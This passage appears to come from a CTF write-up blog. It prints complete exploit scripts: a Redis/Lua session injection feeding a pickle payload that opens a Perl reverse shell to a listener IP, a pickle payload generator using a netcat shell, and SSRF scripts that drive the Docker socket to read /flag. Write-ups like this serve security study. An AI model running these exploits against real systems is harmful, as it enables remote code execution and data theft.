&apos;redis.call(\\\\&quot;set\\\\&quot;,\\\\&quot;bookhub:session:%s\\\\&quot;,\\\\urlDecode(&quot;%s\\\\&quot;)) inputs = &#123; \\&quot;bookhub:session:%s\\&quot; &#125; --&apos; % (</span><br><span class=\"line\">            yoursid, payload, yoursid)</span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        &quot;Cookie&quot;: &apos;bookhub-session=&quot;x%s&quot;&apos; % sid,</span><br><span class=\"line\">        &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class=\"line\">        &apos;X-CSRFToken&apos;: &apos;&apos;,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    res = req.get(URL + &apos;login/&apos;, headers=headers)</span><br><span class=\"line\">    if res.status_code == 200:</span><br><span class=\"line\">        html = res.content</span><br><span class=\"line\">        r = re.findall(r&apos;csrf_token&quot; type=&quot;hidden&quot; value=&quot;(.*?)&quot;&gt;&apos;, html)</span><br><span class=\"line\">        if r:</span><br><span class=\"line\">            headers[&apos;X-CSRFToken&apos;] = r[0]</span><br><span class=\"line\">            # refresh_session</span><br><span class=\"line\">            data = &#123;&apos;submit&apos;: &apos;1&apos;&#125;</span><br><span class=\"line\">            res = req.post(URL + &apos;admin/system/refresh_session/&apos;,</span><br><span class=\"line\">                           data=data, headers=headers)</span><br><span class=\"line\">            if res.status_code == 200:</span><br><span class=\"line\">                print(res.content)</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                print(res.content)</span><br><span class=\"line\">            # fuck</span><br><span class=\"line\">            headers[&apos;Cookie&apos;] = &apos;bookhub-session=vvv&apos;</span><br><span class=\"line\">            res = req.get(URL + &apos;admin/&apos;, headers=headers)</span><br><span class=\"line\">            if res.status_code == 200:</span><br><span class=\"line\">                print(res.content)</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                print(res.content)</span><br></pre></td></tr></table></figure>\n<p>payload2:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__AUTHOR__ = &apos;Virink&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">import os</span><br><span class=\"line\">import sys</span><br><span class=\"line\">import requests as req</span><br><span class=\"line\">import re</span><br><span class=\"line\">from urllib import quote as urlencode</span><br><span class=\"line\">try:</span><br><span class=\"line\">    import cPickle as pickle</span><br><span class=\"line\">except ImportError:</span><br><span class=\"line\">    import pickle</span><br><span class=\"line\"></span><br><span class=\"line\">URL = &quot;http://18.213.16.123:5000/&quot;</span><br><span class=\"line\">listen_ip = &apos;123.207.90.143&apos;</span><br><span class=\"line\">listen_port = 1234</span><br><span class=\"line\"></span><br><span class=\"line\">class exp(object):</span><br><span class=\"line\"></span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\">        s = &quot;perl -e &apos;use Socket;$i=\\&quot;%s\\&quot;;$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\&quot;tcp\\&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\\&quot;&gt;&amp;S\\&quot;);open(STDOUT,\\&quot;&gt;&amp;S\\&quot;);open(STDERR,\\&quot;&gt;&amp;S\\&quot;);exec(\\&quot;/bin/sh -i\\&quot;);&#125;;&apos;&quot; % (listen_ip, listen_port)</span><br><span class=\"line\">        return (os.system, (s,))</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &apos;__main__&apos;:</span><br><span class=\"line\">    payload = urlencode(pickle.dumps([exp()]))</span><br><span class=\"line\">    # 插入payload并防止del</span><br><span class=\"line\">    sid = &apos;\\\\&quot; &#125; local function urlDecode(s) s=string.gsub(s,\\&apos;%%(%x%x)\\&apos;,function(h) return string.char(tonumber(h, 16)) end) return s end &apos; + \\</span><br><span class=\"line\">        &apos;redis.call(\\\\&quot;set\\\\&quot;,\\\\&quot;bookhub:session:qaq\\\\&quot;,urlDecode(\\\\&quot;%s\\\\&quot;)) inputs = &#123; \\&quot;bookhub:session:qaq\\&quot; &#125; --&apos; % (</span><br><span class=\"line\">            payload)</span><br><span class=\"line\">    headers = &#123;&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125;</span><br><span class=\"line\">    # 注入payload</span><br><span class=\"line\">    headers[&quot;Cookie&quot;] = &apos;bookhub-session=&quot;%s&quot;&apos; % sid</span><br><span class=\"line\">    res = req.get(URL + &apos;login/&apos;, headers=headers)</span><br><span class=\"line\">    if res.status_code == 200:</span><br><span class=\"line\">        r = re.findall(r&apos;csrf_token&quot; type=&quot;hidden&quot; value=&quot;(.*?)&quot;&gt;&apos;,</span><br><span class=\"line\">                       res.content.decode(&apos;utf-8&apos;))</span><br><span class=\"line\">        if r:</span><br><span class=\"line\">            # refresh_session</span><br><span class=\"line\">            headers[&apos;X-CSRFToken&apos;] = r[0]</span><br><span class=\"line\">            data = &#123;&apos;submit&apos;: &apos;1&apos;&#125;</span><br><span class=\"line\">            res = req.post(URL + &apos;admin/system/refresh_session/&apos;,</span><br><span class=\"line\">                           data=data, headers=headers)</span><br><span class=\"line\">            if res.status_code == 200:</span><br><span class=\"line\">                # 触发RCE</span><br><span class=\"line\">                req.get(URL + &apos;login/&apos;,</span><br><span class=\"line\">                        headers=&#123;&apos;Cookie&apos;: &apos;bookhub-session=qaq&apos;&#125;)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>pickle payload生成</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/python</span><br><span class=\"line\">#</span><br><span class=\"line\"># Pickle deserialization RCE payload.</span><br><span class=\"line\"># To be invoked with command to execute at it&apos;s first parameter.</span><br><span class=\"line\"># Otherwise, the default one will be used.</span><br><span class=\"line\">#</span><br><span class=\"line\"></span><br><span class=\"line\">import cPickle</span><br><span class=\"line\">import os</span><br><span class=\"line\">import sys</span><br><span class=\"line\">import base64</span><br><span class=\"line\"></span><br><span class=\"line\">DEFAULT_COMMAND = &quot;netcat -c &apos;/bin/bash -i&apos; -l -p 4444&quot;</span><br><span class=\"line\">COMMAND = sys.argv[1] if len(sys.argv) &gt; 1 else DEFAULT_COMMAND</span><br><span class=\"line\"></span><br><span class=\"line\">class PickleRce(object):</span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\">        return (os.system,(COMMAND,))</span><br><span class=\"line\"></span><br><span class=\"line\">print base64.b64encode(cPickle.dumps(PickleRce()))</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"Print-MD\"><a href=\"#Print-MD\" class=\"headerlink\" title=\"Print MD\"></a>Print MD</h3><ol>\n<li><p>subject description</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Make HackMD printable ._. http://54.183.55.10/</span><br><span class=\"line\"></span><br><span class=\"line\">Hint: If you are not skilled at black-box testing, you need to figure out how PrintMD is compatible with outdated browsers. Flag is in the filesystem /flag</span><br><span class=\"line\"></span><br><span class=\"line\">Hint: Here is a render.js for you.</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>render.js</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const &#123;Router&#125; = require(&apos;express&apos;)</span><br><span class=\"line\">const &#123;matchesUA&#125; = require(&apos;browserslist-useragent&apos;)</span><br><span class=\"line\">const router = Router()</span><br><span class=\"line\">const axios = require(&apos;axios&apos;)</span><br><span class=\"line\">const md = require(&apos;../../plugins/md_srv&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">router.post(&apos;/render&apos;, function (req, res, next) &#123;</span><br><span class=\"line\">  let ret = &#123;&#125;</span><br><span class=\"line\">  ret.ssr = !matchesUA(req.body.ua, &#123;</span><br><span class=\"line\">    browsers: [&quot;last 1 version&quot;, &quot;&gt; 1%&quot;, &quot;IE 10&quot;],</span><br><span class=\"line\">    _allowHigherVersions: true</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">  if (ret.ssr) &#123;</span><br><span class=\"line\">    axios(req.body.url).then(r =&gt; &#123;</span><br><span class=\"line\">          ret.mdbody = md.render(r.data)</span><br><span class=\"line\">      res.json(ret)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else &#123;</span><br><span class=\"line\">    ret.mdbody = md.render(&apos;# 请稍候…&apos;)</span><br><span class=\"line\">    res.json(ret)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">module.exports = router</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>漏洞</p>\n<p><strong>print.ba84889093b992d33112.js</strong>中可以找到将markdown文档发送到服务端解析的代码 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">validate: function(e) &#123;</span><br><span class=\"line\">    return e.query.url &amp;&amp; e.query.url.startsWith(&quot;https://hackmd.io/&quot;)</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">asyncData: function(ctx) &#123;</span><br><span class=\"line\">    if(!ctx.query.url.endsWith(&quot;/download&quot;))&#123;</span><br><span class=\"line\">        ctx.query.url += &quot;/download&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ctx.query.ua = ctx.req.headers[&quot;user-agent&quot;] || &quot;&quot;;</span><br><span class=\"line\">    return axios.post(&quot;/api/render&quot;, qs.stringify(&#123;...ctx.query&#125;)).then(function(e) &#123;</span><br><span class=\"line\">        return &#123;</span><br><span class=\"line\">            ...e.data,</span><br><span class=\"line\">            url: ctx.query.url</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">mounted: function() &#123;</span><br><span class=\"line\">    if (!this.ssr)&#123;</span><br><span class=\"line\">        axios(this.url).then(function(t) &#123;</span><br><span class=\"line\">            this.mdbody = md.render(t.data)</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里直接使用<code>qs.stringify({...ctx.query}</code>,因而在render.js中</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios(req.body.url).then(<span class=\"function\"><span class=\"params\">r</span> =&gt;</span> &#123;</span><br><span class=\"line\">    ret.mdbody = md.render(r.data)</span><br><span class=\"line\">    res.json(ret)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>req.body.url</code> 可控</p>\n</li>\n<li><p>漏洞利用</p>\n<p><strong>axios</strong>这个东西是不支持<strong>file://</strong>协议的，但是通过文档可知，他支持<strong>UNIX Socket</strong> 。</p>\n<p><img src=\"/assets/realworldctf/TIM截图20180802194917.png\" alt=\"\"></p>\n<p>测试<code>ping</code>。</p>\n<blockquote>\n<p>GET <a href=\"http://54.183.55.10/print?url[url]=/_ping&amp;url[socketPath]=/var/run/docker.sock&amp;url=https://hackmd.io/\" target=\"_blank\" rel=\"noopener\">http://54.183.55.10/print?url[url]=/_ping&amp;url[socketPath]=/var/run/docker.sock&amp;url=https://hackmd.io/</a> HTTP/1.1</p>\n</blockquote>\n<p><img src=\"/assets/realworldctf/TIM截图20180802195456.png\" alt=\"\"></p>\n</li>\n<li><p>exploit.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests <span class=\"keyword\">as</span> req</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</span><br><span class=\"line\"><span class=\"keyword\">from</span> urllib <span class=\"keyword\">import</span> quote <span class=\"keyword\">as</span> urlencode</span><br><span class=\"line\"></span><br><span class=\"line\">URL = <span class=\"string\">\"http://54.183.55.10/print?&#123;url&#125;&amp;url=https%3A%2F%2Fhackmd.io%2Fvbz2j6hkR9CIgABjEbRrzQ\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">\"User-Agent\"</span>: <span class=\"string\">\"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(u)</span>:</span></span><br><span class=\"line\">    res = req.get(u, timeout=<span class=\"number\">10</span>, headers=headers)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> res.status_code == <span class=\"number\">200</span>:</span><br><span class=\"line\">        soup = BeautifulSoup(res.content, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">        body = soup.select(<span class=\"string\">\".markdown-body\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> body:</span><br><span class=\"line\">            print(body[<span class=\"number\">0</span>].text)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">True</span></span><br><span class=\"line\">    print(<span class=\"string\">\"[-] error\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fuck</span><span class=\"params\">(_u)</span>:</span></span><br><span class=\"line\">    _u += <span class=\"string\">'&amp;url[socketPath]=/var/run/docker.sock'</span></span><br><span class=\"line\">    pl = URL.format(url=_u)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        get(pl)</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    container_name = <span class=\"string\">''</span>.join(random.sample(</span><br><span class=\"line\">        string.ascii_letters + string.digits, <span class=\"number\">6</span>))</span><br><span class=\"line\">    _us = [</span><br><span class=\"line\">        <span class=\"string\">'url[url]=/_ping&amp;'</span>,</span><br><span class=\"line\">        <span class=\"string\">'url[method]=post&amp;url[url]=http://127.0.0.1/assets/create?fromImage=alpine:latest'</span>,</span><br><span class=\"line\">        <span class=\"string\">'url[method]=post&amp;url[url]=http://127.0.0.1/containers/create?name=%s&amp;url[data][Image]=alpine:latest&amp;url[data][Volumes][flag][path]=/getflag&amp;url[data][Binds][]=/flag:/getflag:ro&amp;url[data][Entrypoint][]=/bin/ls'</span> % container_name,</span><br><span class=\"line\">        <span class=\"string\">'url[method]=post&amp;url[url]=http://127.0.0.1/containers/%s/start'</span> % container_name,</span><br><span class=\"line\">        <span class=\"string\">'url[method]=get&amp;url[url]=http://127.0.0.1/containers/%s/archive?path=/getflag'</span> % container_name</span><br><span class=\"line\">    ]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> _us:</span><br><span class=\"line\">        fuck(i)</span><br></pre></td></tr></table></figure>\n<p>exploit1.py</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\">#</span><br><span class=\"line\"># SakiiR @ Hexpresso</span><br><span class=\"line\"># cc XeR &amp; BitK</span><br><span class=\"line\"># Let&apos;s go now (:</span><br><span class=\"line\">#</span><br><span class=\"line\"># --+ Python 2 +--</span><br><span class=\"line\"></span><br><span class=\"line\">import random</span><br><span class=\"line\">import pwn</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import urllib</span><br><span class=\"line\"></span><br><span class=\"line\">urlencode = urllib.quote_plus</span><br><span class=\"line\"></span><br><span class=\"line\">OUTFILE = &quot;flag.txt&quot;</span><br><span class=\"line\">MAX_ROWS = 100</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def random_container_name(n=10, charset=(&quot;abcdefghijklmnopqrstUVWXYZ&quot;</span><br><span class=\"line\">                                         &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class=\"line\">                                         &quot;0123456789&quot;)):</span><br><span class=\"line\">    return &apos;&apos;.join([</span><br><span class=\"line\">        charset[random.randint(0, len(charset) - 1)] for _ in range(n)</span><br><span class=\"line\">    ])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def main():</span><br><span class=\"line\"></span><br><span class=\"line\">    container_name = random_container_name()</span><br><span class=\"line\">    pwn.log.info(&quot;Your container name is &apos;&#123;&#125;&apos;&quot;.format(container_name))</span><br><span class=\"line\"></span><br><span class=\"line\">    # Pull alpine image :)</span><br><span class=\"line\">    # --------------------</span><br><span class=\"line\">    endpoint = urlencode(&quot;http://127.0.0.1/assets/create?fromImage=alpine:latest&quot;)</span><br><span class=\"line\">    url = (&apos;http://54.183.55.10/print&apos;</span><br><span class=\"line\">           &apos;?url[method]=POST&apos;</span><br><span class=\"line\">           &apos;&amp;url[url]=&#123;&#125;&apos;</span><br><span class=\"line\">           &apos;&amp;url[socketPath]=/var/run/docker.sock&apos;</span><br><span class=\"line\">           &apos;&amp;url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download&apos;).format(endpoint)</span><br><span class=\"line\">    pwn.log.info(&quot;Pulling alpine:      &apos;&#123;&#125;[...]&apos;&quot;.format(url[:MAX_ROWS]))</span><br><span class=\"line\">    r = requests.get(url)</span><br><span class=\"line\">    pwn.log.info(&quot;Response: &#123;&#125;&quot;.format(r.status_code))</span><br><span class=\"line\"></span><br><span class=\"line\">    # Creating container (image)</span><br><span class=\"line\">    # --------------------------</span><br><span class=\"line\">    endpoint = urlencode(&apos;http://127.0.0.1/containers/create?name=&#123;&#125;&apos;.format(container_name))</span><br><span class=\"line\">    url = (&apos;http://54.183.55.10/print&apos;</span><br><span class=\"line\">           &apos;?url[method]=POST&apos;</span><br><span class=\"line\">           &apos;&amp;url[url]=&#123;&#125;&apos;</span><br><span class=\"line\">           &apos;&amp;url[data][Volumes][flag][path]=/sakiir&apos;</span><br><span class=\"line\">           &apos;&amp;url[data][Binds][]=/flag:/sakiir:ro&apos;</span><br><span class=\"line\">           &apos;&amp;url[data][Entrypoint][]=/bin/sh&apos;</span><br><span class=\"line\">           &apos;&amp;url[data][Image]=alpine:latest&apos;</span><br><span class=\"line\">           &apos;&amp;url[socketPath]=/var/run/docker.sock&apos;</span><br><span class=\"line\">           &apos;&amp;url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download&apos;).format(endpoint)</span><br><span class=\"line\">    pwn.log.info(&quot;Creating container:  &apos;&#123;&#125;[...]&apos;&quot;.format(url[:MAX_ROWS]))</span><br><span class=\"line\">    pwn.log.info(&quot;This will take some time then crash with a 503&quot;)</span><br><span class=\"line\">    pwn.log.info(&quot;The container will still be created (:&quot;)</span><br><span class=\"line\">    r = requests.get(url)</span><br><span class=\"line\">    pwn.log.info(&quot;Response: &#123;&#125;&quot;.format(r.status_code))</span><br><span class=\"line\"></span><br><span class=\"line\">    # Starting container_name</span><br><span class=\"line\">    # -----------------------</span><br><span class=\"line\">    endpoint = urlencode(&apos;http://127.0.0.1/containers/&#123;&#125;/start&apos;.format(container_name))</span><br><span class=\"line\">    url = (&apos;http://54.183.55.10/print&apos;</span><br><span class=\"line\">           &apos;?url[method]=POST&apos;</span><br><span class=\"line\">           &apos;&amp;url[url]=&#123;&#125;&apos;</span><br><span class=\"line\">           &apos;&amp;url[socketPath]=/var/run/docker.sock&apos;</span><br><span class=\"line\">           &apos;&amp;url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download&apos;).format(endpoint)</span><br><span class=\"line\">    pwn.log.info(&quot;Starting container:  &apos;&#123;&#125;[...]&apos;&quot;.format(url[:MAX_ROWS]))</span><br><span class=\"line\">    r = requests.get(url)</span><br><span class=\"line\">    pwn.log.info(&quot;Response: &#123;&#125;&quot;.format(r.status_code))</span><br><span class=\"line\"></span><br><span class=\"line\">    # Archive container (Archive the /sakiir directory and get it back :))</span><br><span class=\"line\">    # --------------------------------------------------------------------</span><br><span class=\"line\">    endpoint = urlencode(&quot;http://127.0.0.1/containers/&#123;&#125;/archive?path=/sakiir&quot;.format(container_name))</span><br><span class=\"line\">    url = (&apos;http://54.183.55.10/print&apos;</span><br><span class=\"line\">           &apos;?url[method]=GET&apos;</span><br><span class=\"line\">           &apos;&amp;url[url]=&#123;&#125;&apos;</span><br><span class=\"line\">           &apos;&amp;url[socketPath]=/var/run/docker.sock&apos;</span><br><span class=\"line\">           &apos;&amp;url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download&apos;).format(endpoint)</span><br><span class=\"line\">    pwn.log.info(&quot;Archiving container: &apos;&#123;&#125;[...]&apos;&quot;.format(url[:MAX_ROWS]))</span><br><span class=\"line\">    r = requests.get(url)</span><br><span class=\"line\">    pwn.log.info(&quot;Response: &#123;&#125;&quot;.format(r.status_code))</span><br><span class=\"line\">    with open(OUTFILE, &apos;w&apos;) as f:</span><br><span class=\"line\">        f.write(r.content)</span><br><span class=\"line\">        pwn.log.info(&quot;Flag written to file &apos;&#123;&#125;&apos;&quot;.format(OUTFILE))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &apos;__main__&apos;:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h2><h3 id=\"state-of-the-art-vm\"><a href=\"#state-of-the-art-vm\" class=\"headerlink\" title=\"state-of-the-art vm\"></a>state-of-the-art vm</h3><p>description:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwn</span><br><span class=\"line\"></span><br><span class=\"line\">Latest QEMU is unbreakable, and we also hardened it.</span><br><span class=\"line\"></span><br><span class=\"line\">NOTE: Host OS is Ubuntu 16.04</span><br><span 